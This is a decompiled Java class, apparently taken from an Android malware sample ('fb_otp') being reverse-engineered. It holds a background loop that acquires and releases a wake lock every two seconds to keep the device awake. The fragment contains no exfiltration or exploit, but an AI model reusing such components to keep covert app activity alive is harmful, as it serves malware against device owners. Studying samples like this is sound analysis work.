import android.content.Context;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import java.util.concurrent.TimeUnit;

final class cC
  implements Runnable
{
  cC(cB paramcB) {}
  
  public final void run()
  {
    try
    {
      for (;;)
      {
        TimeUnit.SECONDS.sleep(2L);
        PowerManager.WakeLock localWakeLock = ((PowerManager)this.a.a.getSystemService("power")).newWakeLock(6, "My Tag");
        localWakeLock.acquire();
        localWakeLock.release();
      }
    }
    catch (InterruptedException localInterruptedException)
    {
      localInterruptedException.printStackTrace();
    }
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/cC.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */